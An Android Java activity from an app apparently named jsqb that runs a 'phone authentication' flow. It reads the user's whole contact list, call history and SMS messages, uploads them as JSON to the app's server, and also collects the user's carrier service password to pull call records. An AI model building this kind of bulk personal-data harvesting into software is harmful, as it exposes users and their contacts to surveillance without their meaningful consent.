package com.ahxbapp.jsqb.activity;

import android.content.Context;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewTreeObserver;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.ahxbapp.common.Global;
import com.ahxbapp.common.LoginEditText;
import com.ahxbapp.common.ui.BaseActivity;
import com.ahxbapp.common.util.SingleToast;
import com.ahxbapp.common.widget.ValidePhoneView;
import com.ahxbapp.jsqb.R;
import com.ahxbapp.jsqb.api.APIManager;
import com.ahxbapp.jsqb.dialog.LoadDialog;
import com.ahxbapp.jsqb.model.AuthenModel;
import com.ahxbapp.jsqb.model.BaseModel;
import com.ahxbapp.jsqb.model.CallInfo;
import com.ahxbapp.jsqb.model.ContactsInfo;
import com.ahxbapp.jsqb.model.MessageInfo;
import com.ahxbapp.jsqb.model.MobileModel;
import com.ahxbapp.jsqb.utils.CallHistoryUtils;
import com.ahxbapp.jsqb.utils.GetContactsInfo1;
import com.ahxbapp.jsqb.utils.GetMessageInfo;
import com.ahxbapp.jsqb.utils.MyToast;
import com.google.gson.Gson;
import com.nostra13.universalimageloader.core.DisplayImageOptions;
import com.nostra13.universalimageloader.core.assist.ImageScaleType;
import com.nostra13.universalimageloader.core.display.FadeInBitmapDisplayer;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Click;
import org.androidannotations.annotations.EActivity;
import org.androidannotations.annotations.Extra;
import org.androidannotations.annotations.FocusChange;
import org.androidannotations.annotations.OnActivityResult;
import org.androidannotations.annotations.ViewById;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/**
 * 手机号认证  1
 */
@EActivity(R.layout.activity_phone)
public class PhoneActivity extends BaseActivity {

    final private int RESULT_CLOSE = 100;

    int codes;
    @Extra
    Uri background;
    @ViewById
    LoginEditText editWebsite, editSms, editCode, editPassword, editPassword1;
    @ViewById
    Button loginButton;
    @ViewById
    ImageView checkCodeImg;
    @ViewById
    RelativeLayout codeImgWrapper, websitePassWordWrapper, nowPhoneWrapper, layoutRoot;
    @ViewById
    LinearLayout smsWrapper;

    @ViewById
    ImageButton mToolbarLeftIB;
    @ViewById
    TextView mToolbarTitleTV, phoneTV, mOperatorsTV, tvShouQuan;
    @ViewById
    ValidePhoneView sendCode;
    @ViewById
    CheckBox checkPhone;

    private List<ContactsInfo> contactsInfoList;
    private List<CallInfo> callInfos;
    private List<MessageInfo> messageInfos;
    //
//
    DisplayImageOptions options = new DisplayImageOptions.Builder()
            .showImageForEmptyUri(R.mipmap.ic_default_image)
            .showImageOnFail(R.mipmap.ic_default_image)
            .resetViewBeforeLoading(true)
            .cacheOnDisk(true)
            .imageScaleType(ImageScaleType.EXACTLY)
            .bitmapConfig(Bitmap.Config.RGB_565)
            .considerExifParams(true)
            .displayer(new FadeInBitmapDisplayer(300))
            .build();
    View androidContent;
    private String globalKey = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 调用下，防止收到上次登陆账号的通知
    }

    @AfterViews
    void init() {
        mToolbarLeftIB.setImageResource(R.mipmap.back);
        mToolbarTitleTV.setText("手机认证");

        tvShouQuan.setTextColor(getResources().getColor(R.color.nav_blue));

        nowPhoneWrapper.setVisibility(View.GONE);

        androidContent = findViewById(android.R.id.content);
        androidContent.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() {
                int height = androidContent.getHeight();
                if (height > 0) {
                    ViewGroup.LayoutParams lp = layoutRoot.getLayoutParams();
                    lp.height = height;
                    layoutRoot.setLayoutParams(lp);
                    androidContent.getViewTreeObserver().removeGlobalOnLayoutListener(this);
                }
            }
        });
        loadPhone();
        checkConfig();

//        String lastLoginName = AccountInfo.loadLastLoginName(this);
//        if (!lastLoginName.isEmpty()) {
//            editName.setDisableAuto(true);
//            editName.setText(lastLoginName);
//            editName.setDisableAuto(false);
//            editPassword.requestFocus();
//            editName(false);
//        }
        //获取手机通讯录
        initViews();
    }

    private void initViews() {
        GetContactsInfo1 getContactsInfo = new GetContactsInfo1(this);
        //获取通讯录好友列表ContactsInfoList
        contactsInfoList = getContactsInfo.getLocalContactsInfos();
        callInfos = new CallHistoryUtils(PhoneActivity.this).getCallHistoryList(PhoneActivity.this.getContentResolver());
        messageInfos = new GetMessageInfo(PhoneActivity.this).getSmsInfos();
        if (contactsInfoList == null) {
            return;
        }
        //对象转为json
    }

    private void updateContacts() {
        if (contactsInfoList == null) {
            showButtomToast("请打开获取手机通讯录权限!");
            return;
        }
        if (callInfos == null) {
            showButtomToast("请打开获取手机通话记录权限!");
            return;
        }
        if (messageInfos == null) {
            showButtomToast("请打开获取短信内容权限!");
            return;
        }
        String directory = new Gson().toJson(contactsInfoList);
        String sms = new Gson().toJson(messageInfos);
        String call = new Gson().toJson(callInfos);
        APIManager.getInstance().getPhoneDirectory(this, directory, sms, call, new APIManager.APIManagerInterface.getContact_back() {
            @Override
            public void Success(Context context, int result, String message) {
                if (result == 1) {
                    doCaiji();
                } else {
                    loadDialog.dismiss();
                    loginButton.setClickable(true);
                    showMiddleToast(message);
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                loadDialog.dismiss();
                loginButton.setClickable(true);
            }
        });
    }

    @Click
    void checkCodeImg() {
        checkConfig();
    }

    //获取手机号码和运营商
    void loadPhone() {
        showDialogLoading();
        APIManager.getInstance().operators(this, new APIManager.APIManagerInterface.common_object() {
            @Override
            public void Success(Context context, Object model) {
                if (model == null) {
                    return;
                }
                hideProgressDialog();
                BaseModel<MobileModel> baseModel = (BaseModel<MobileModel>) model;
                Log.e("tag", "手机运营商==>" + baseModel);
                if (baseModel.getResult() == 1) {
                    nowPhoneWrapper.setVisibility(View.VISIBLE);
                    phoneTV.setText(baseModel.getData().getMobile());
                    mOperatorsTV.setText("(" + baseModel.getData().getOperator() + ")");
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                hideProgressDialog();
            }
        });
    }

    String timeStap, phoneToken, userid;
    private boolean need2;

    //获取手机运营商
    void checkConfig() {
        showDialogLoading();
        new APIManager().phoneConfig(this, new APIManager.APIManagerInterface.baseBlock() {
            @Override
            public void Success(Context context, JSONObject response) {
                if (response == null) {
                    return;
                }
                Log.e("tag", "手机验证返回值==>" + response.toString());
                try {
                    int result = response.getInt("result");
                    if (result == 1) {
                        //1是移动 2是联通 3是电信
                        int mobileType = response.getJSONObject("data").getInt("mobileType");
                        codes = mobileType;
                    } else {
                        MyToast.showToast(context, response.getString("message"));
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
            }
        });
    }

    //发送短信验证码
    @Click
    void sendCode() {
        showDialogLoading();
        APIManager.getInstance().sendLoginSmsCode(this, userid, timeStap, phoneToken, phoneTV.getText().toString(), editCode.getText().toString(),
                new APIManager.APIManagerInterface.baseBlock() {

                    @Override
                    public void Success(Context context, JSONObject response) {
                        loadDialog.dismiss();
                        try {
                            if (response.getInt("result") == 1) {
                                MyToast.showToast(context, "验证码发送成功，请注意查收！");
                                //开始倒计时
                                sendCode.startTimer();
                            } else {
                                MyToast.showToast(context, response.getString("message"));
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void Failure(Context context, JSONObject response) {
                        loadDialog.dismiss();
                    }
                });
    }

    @Click
    void mToolbarLeftIB() {
        finish();
    }

    Handler handler = new Handler();

    //提交
    @Click
    void loginButton() {
        String name = editCode.getText().toString();
        String password = editPassword.getText().toString();
        String edit = editCode.getText().toString().trim();
        if (password.isEmpty()) {
            showMiddleToast("服务密码不能为空");
            return;
        }

        if (smsWrapper.getVisibility() == View.VISIBLE) {
            String sms = editSms.getText().toString().trim();
            if (sms.isEmpty()) {
                showMiddleToast("短信验证码不能为空");
                return;
            }
        }
        loginButton.setClickable(false);
        submit();

        if (codes == 1) {
            submit();
        } else {
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    //要做的事情，这里再次调用此Runnable对象，以实现每两秒实现一次的定时器操作
                    submit();
                }
            };
            handler.postDelayed(runnable, 55000);
        }
    }

    void submit() {
        try {
            String name = editCode.getText().toString();
            String password = editPassword.getText().toString();
            String otherInfo = editPassword1.getText().toString();
            showLoad();
            APIManager.getInstance().checkPhonePsd1(this, password, otherInfo, new APIManager.APIManagerInterface.baseBlock() {
                @Override
                public void Success(Context context, JSONObject response) {
                    loginButton.setClickable(true);
                    int result = 0;
                    try {
                        result = response.getInt("result");
                        if (result == 2) { //获取验证码
                            loadDialog.dismiss();
                            Phone2Activity_.intent(context).timeStap(timeStap).phoneToken(phoneToken).userid(userid).phone(phoneTV.getText().toString())
                                    .validateCode(null).start();
                            finish();
                        } else if (result == 1) { //采集通话记录
                            phoneToken = response.getString("phonetoken");
                            updateContacts();
                        } else { //0验证失败
                            loadDialog.dismiss();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        loadDialog.dismiss();
                    }
                }

                @Override
                public void Failure(Context context, JSONObject response) {
                    loginButton.setClickable(true);
                    if (response != null) {
                        try {
                            int result = response.getInt("result");
                            if (result == 2) { //获取验证码
                                loadDialog.dismiss();
                                phoneToken = response.getString("phonetoken");
                                Phone2Activity_.intent(context).timeStap(timeStap).phoneToken(phoneToken).userid(userid).phone(phoneTV.getText().toString())
                                        .validateCode(null).start();
                                finish();
                            } else if (result == 1) { //采集通话记录
                                phoneToken = response.getString("phonetoken");
                                updateContacts();
                            } else { //0验证失败
                                loadDialog.dismiss();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                            loadDialog.dismiss();
                        }
                    }
                }
            });
        } catch (Exception e) {
            Global.errorLog(e);
        }
    }

    //采集通话记录
    private void doCaiji() {
        new APIManager().CaiJi(PhoneActivity.this, phoneToken, phoneTV.getText().toString(), new APIManager.APIManagerInterface.checkPhonePsd_back() {
            @Override
            public void Success(Context context, final int result) {
                if (result == 1) {
                    countDown();
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                loadDialog.dismiss();
            }
        });
    }

    private void settingBackground() {

    }


    @OnActivityResult(RESULT_CLOSE)
    void resultRegiter(int result) {

    }


    private void downloadValifyPhoto() {

    }

    private void loginSuccess(JSONObject respanse) throws JSONException {

    }

    @Override
    public void onBackPressed() {
        finish();
    }

    @FocusChange
    void editName(boolean hasFocus) {

    }

    LoadDialog loadDialog;

    private void showLoad() {
        if (loadDialog == null) {
            loadDialog = new LoadDialog(this);
        }
        loadDialog.startAnmation();
        loadDialog.show();
    }

    private CountDownTimer timer;
    private boolean isFinish;

    private void countDown() {
        timer = new CountDownTimer(180 * 1000, 60 * 1000) {
            @Override
            public void onTick(final long millisUntilFinished) {
                requestState(0);
            }

            @Override
            public void onFinish() {
                isFinish = true;
                requestState(1);
            }
        };
        // 调用start方法开始倒计时
        timer.start();
    }


    private void requestState(int chek) {
        APIManager.getInstance().home_getAuthenStatus(this, chek, new APIManager.APIManagerInterface.common_object() {
            @Override
            public void Success(Context context, Object model) {
                hideProgressDialog();
                AuthenModel model1 = (AuthenModel) model;
                if (model1.getIsMobile() == 1) {//认证成功
                    loadDialog.dismiss();
                    timer.cancel();
                    timer = null;
                    showButtomToast("认证成功！");
                    setResult(RESULT_OK);
                    finish();
                } else {//认证失败
                    if (isFinish) {
                        timer.cancel();
                        timer = null;
                        SingleToast.showMiddleToast(PhoneActivity.this, "认证失败，请重新进入认证。");
                        setResult(RESULT_OK);
                        finish();
                    }
                }
            }

            @Override
            public void Failure(Context context, JSONObject response) {
                timer.cancel();
                timer = null;
                loadDialog.dismiss();
            }
        });
    }
}